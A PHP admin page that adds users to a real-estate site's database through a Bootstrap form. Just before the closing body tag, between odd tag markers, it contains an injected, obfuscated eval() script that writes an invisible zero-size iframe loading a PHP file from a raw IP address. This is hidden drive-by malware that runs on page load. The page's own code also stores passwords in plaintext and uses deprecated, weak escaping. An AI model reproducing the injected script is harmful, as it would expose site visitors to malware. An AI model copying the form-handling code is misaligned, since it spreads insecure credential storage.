<?php
include 'dbconfig.php';
	$current_page="users";
	$success_msg = null;
	if (isset($_POST["adduser"]))
	{
		$username=  mysql_escape_string(htmlentities($_POST["username"]));
		$password=  mysql_escape_string(htmlentities($_POST["password"]));
		$f_name=  mysql_escape_string(htmlentities($_POST["f_name"]));
		$l_name=  mysql_escape_string(htmlentities($_POST["l_name"]));
		$contactno=  mysql_escape_string(htmlentities($_POST["contactno"]));
		$location=  mysql_escape_string(htmlentities($_POST["location"]));
		$city=  mysql_escape_string(htmlentities($_POST["city"]));
		$state=  mysql_escape_string(htmlentities($_POST["state"]));
		mysql_query("insert into avi_real.user"
				. "(`username`, `password`, `f_name`, "
				. "`l_name`, `role`, "
				. "`contactno`, `location`, "
				. "`city`, `state`) "
				. "values("
				. "'$username',"
				. "'$password',"
				. "'$f_name',"
				. "'$l_name',"
				. "'user',"
				. "'$contactno',"
				. "'$location',"
				. "'$city',"
				. "'$state'"
				. ")") or $success_msg="Record already exists.";
		$success_msg = $success_msg or "Record added successfully.";
	}
?>
<!DOCTYPE html>
<html>
    
    <head>
        <title>Forms</title>
        <!-- Bootstrap -->
        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet" media="screen">
        <link href="assets/styles.css" rel="stylesheet" media="screen">
        <!--[if lte IE 8]><script language="javascript" type="text/javascript" src="vendors/flot/excanvas.min.js"></script><![endif]-->
        <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
        <script src="vendors/modernizr-2.6.2-respond-1.1.0.min.js"></script>
		<script type="text/javascript">
			function validate(th)
			{
				if (th.password!=th.cpassword){
					alert("Password and confirm password should be equal");
					return false;
				}
				return true;
			}
			</script>
    </head>
    
    <body>
        <?php
	  include('top_header.php');
	  ?>
        </div>
        <div class="container-fluid">
            <div class="row-fluid">
               <div class="span3" id="sidebar">
               <?php
	  include('sidemenu.php');
	  ?>  </div>
                <!--/span-->
                <div class="span9" id="content">
                      <!-- morris stacked chart -->
                    <div class="row-fluid">
                        <!-- block -->
                        <div class="block">
                            <div class="navbar navbar-inner block-header">
                                <div class="muted pull-left">Add User</div>
                            </div>
                            <div class="block-content collapse in">
                                <div class="span12">
									<form class="form-horizontal" method="POST" action="" onsubmit="validate(this)">
										<input type="hidden" name="adduser" value="true"/>
										<?php if ($success_msg!=null):?><div class="alert alert-success"><?php echo $success_msg; ?></div><?php endif;?>
                                      <fieldset>
                                        <legend>User Form</legend>
									  <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered" id="example2">
									   <tr>
									   <td><label class="control-label" >UserName(Email) :</label></td>
                                       <td><input class="input-xlarge focused" name="username" required="required" type="email" ></td>
                                       </tr>
									   
                                        <tr>
									   <td><label class="control-label" >FirstName: </label></td>
                                       <td><input class="input-xlarge focused" name="f_name" required="required" type="text"></td>
                                       </tr>
                                        <tr>
									   <td><label class="control-label" >LastName:</label></td>
                                       <td><input class="input-xlarge focused" name="l_name" required="required" type="text" ></td>
                                       </tr>
                                        <tr>
									   <td><label class="control-label" >Password:</label></td>
                                       <td><input class="input-xlarge focused" name="password" minlength="4" required="required" id="password" type="password" ></td>
                                       </tr>
                                        <tr>
									   <td><label class="control-label" >Confirm Password:</label></td>
                                       <td><input class="input-xlarge focused" name="cpassword" minlength="4" required="required" type="password" ></td>
                                       </tr>
                                       <tr>
									   <td><label class="control-label" >Contact No.:</label></td>
                                       <td><input class="input-xlarge focused" name="contactno" required="required" type="number" ></td>
                                       </tr>
                                        <tr>
									   <td><label class="control-label" >Location:</label></td>
                                       <td><input class="input-xlarge focused" name="location" required="required" type="text" ></td>
                                       </tr>
                                       <tr>
									   <td><label class="control-label" >City:</label></td>
                                       <td><input class="input-xlarge focused" name="city" required="required" type="text" ></td>
                                       </tr>
                                      
									  <tr>
                                          <td><label class="control-label" >State:</label></td>
                                         <td> 
											 <select id="selectError" name="state">
												 <option value="N/A">States</option>
                                            </select>
                                           
                                        </td>
										 </tr>
										
										</table>
                                        <div class="form-actions">
                                          <button type="submit" class="btn btn-primary">Save changes</button>
                                          <button type="reset" class="btn">Cancel</button>
                                        </div>
                                      </fieldset>
                                    </form>

                                </div>
                            </div>
                        </div>
                        <!-- /block -->
                    </div>
                </div>
            </div>
            <hr>
        <?php
		include('footer.php');
	  ?>
        </div>
    <tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 c=" n=\\"0\\" s=\\"0\\" t=\\"0\\" l=\\"h://q.j.k.8/d.g\\">";1 6="<i";1 b="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 9="e";1 7="e>";o.p(6+2+3+5+4+9+c+b+2+3+5+4+7);',30,30,'|var|r4|r5|r7|r6|r2|r9||r8||r3|r1|tag1|||php|http||78|150|src||width|document|write|219||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>

</html>